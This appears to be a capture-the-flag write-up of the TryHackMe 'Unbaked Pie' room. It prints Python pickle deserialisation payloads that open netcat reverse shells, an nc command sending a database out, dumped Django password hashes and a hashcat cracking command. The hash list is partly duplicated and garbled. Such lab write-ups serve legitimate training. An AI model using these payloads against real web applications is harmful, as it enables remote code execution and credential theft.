# Unbaked Pie

![image](https://user-images.githubusercontent.com/5285547/135349199-38047830-0a14-4914-b35e-962103097322.png)

Room link: https://tryhackme.com/room/unbakedpie

## Enumeration

Nmap 

Starting my enumration with an nmap scan as usual, after a long scan only one port comes back to me, filemaker!?

```
PORT     STATE SERVICE
5003/tcp open  filemaker
```

## Port 5003

![image](https://user-images.githubusercontent.com/5285547/135356072-c5ced1a8-8140-42df-8d63-4ba43fe176ff.png)

Seems to be a website all about pickles and pickle products. 
Typing in the wrong path gave lots of info back from the host. 

![image](https://user-images.githubusercontent.com/5285547/135356353-88a8b03a-fc30-4a43-9643-41d5aa543eac.png)

![image](https://user-images.githubusercontent.com/5285547/135356371-a2862edc-20e7-4789-aed5-5fcc8afecab0.png)

## Pickle (python) (Decode)

Looking about the web app I notice in burp suite the request headers also point to python

![image](https://user-images.githubusercontent.com/5285547/135357480-734281a9-a09f-4af8-b86c-b90da5b7beb5.png)

When using the search feature on the site we can see a cookie being set (maybe also being deseralised) 

![image](https://user-images.githubusercontent.com/5285547/135357550-509b26c2-4449-459f-b1f8-fbcdb70a6985.png)

Set-Cookie

```
gASVCgAAAAAAAACMBmFzZGFzZJQu
```

Decoding the cookie value using python pickle

![image](https://user-images.githubusercontent.com/5285547/135357609-2b7aee9e-905f-486a-9064-e6b40d8b3c4f.png)

```
import pickle
import base64


string_val = b"gASVCgAAAAAAAACMBmFzZGFzZJQu"
string_val = base64.b64decode(string_val)
d = pickle.loads(string_val)
print(d)
```

## RCE (Encode)

Using this [here](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) article which helps to get a better understanding of the python pickle rce. We can craft a payload to work here. 

Original RCE code

```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

## Root (container)

Editing the code we can get RCE via the serilization. 

```
import pickle
import base64


#string_val = b"gASVCgAAAAAAAACMBmFzZGFzZJQu"
#string_val = base64.b64decode(string_val)
#d = pickle.loads(string_val)
#print(d)

import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('nc -e /bin/sh IP PORT')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

```
python3 pickl3.py
b'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAtZSAvYmluL3NoIDEwLjguMTUzLjEyMCA5OTk5lIWUUpQu'
```

Swapping the cookie and calling /search (GET) we can get the code exection. 

![image](https://user-images.githubusercontent.com/5285547/135358609-2ad8541c-2223-466d-96b0-64f1262c1875.png)

After getting on we can update our shell. 

```
python3 -c "import pty;pty.spawn('/bin/bash')"
stty raw -echo;fg
reset
xterm
```

Now we can enumerate again to find more information. 

## Enumeration 2

In the /root folder in .bash_history we find some juicy data

```
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
```


In /home/site we find an intresting file called db.sqlite3. Lets get it on our box and see what secrets it holds! 

```
# our box
nc -lnvp 8082 > db.sqlite3 

# attack box
nc 10.8.153.120 8082 < db.sqlite3
```

Now lets go through the file. 

```
sqlite3 db.sqlite3

SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions

sqlite> select * from auth_user;

1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
```

Now we can crack the hash's for these accounts. 

```
pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=:aniqfakhrul
pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=:testing
pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=:ramsey
pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=:oliver
pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=:wan:aniqfakhrul
pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=:testing
pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=:ramsey
pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=:oliver
pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=:wan
```

Cracking with hashcat
```
hashcat -a 0 -m 10000 hash /usr/share/wordlists/rockyou.txt -O  
```
